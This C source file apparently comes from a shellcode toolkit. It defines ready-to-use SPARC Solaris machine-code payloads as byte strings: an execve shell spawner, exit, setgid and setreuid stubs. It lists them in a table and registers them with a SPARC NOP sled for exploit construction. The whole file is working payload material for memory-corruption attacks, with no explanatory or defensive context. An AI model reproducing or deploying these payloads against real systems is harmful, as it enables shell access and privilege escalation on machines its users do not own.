#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h"
#include "sparc.h"


shellcode	sparc_solaris_execvesh = {
	"sparc-solaris-execve",
	48,
	"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda"
	"\x90\x03\xa0\x08\x92\x13\x80\x0e\x9c\x03\xa0\x10"
	"\x94\x1b\x80\x0e\xec\x3b\xbf\xf8\xd0\x23\xbf\xf0"
	"\xd4\x23\xbf\xf4\x82\x10\x20\x3b\x91\xd0\x20\x08",
};


shellcode	sparc_solaris_exit = {
	"sparc-solaris-exit",
	8,
	"\x82\x10\x20\x01\x91\xd0\x20\x08",
};


shellcode	sparc_solaris_setgid = {
	"sparc-solaris-setgid",
	16,
	"\x90\x10\x21\x42\x90\x1a\x21\x44\x82\x10\x20\x2e"
	"\x91\xd0\x20\x08",
};


shellcode	sparc_solaris_setreuid = {
	"sparc-solaris-setreuid",
	24,
	"\x90\x10\x21\x42\x90\x1a\x21\x44\x92\x10\x21\x46"
	"\x92\x1a\x61\x48\x82\x10\x20\x2e\x91\xd0\x20\x08",
};


shellcode *	sparc_solaris_shellcodes[] = {
	&sparc_solaris_execvesh,
	&sparc_solaris_exit,
	&sparc_solaris_setgid,
	&sparc_solaris_setreuid,
	NULL,
};


arch	sparc_solaris = {
	"sparc-solaris",
	4,
	sparc_nop,
	sparc_solaris_shellcodes
};



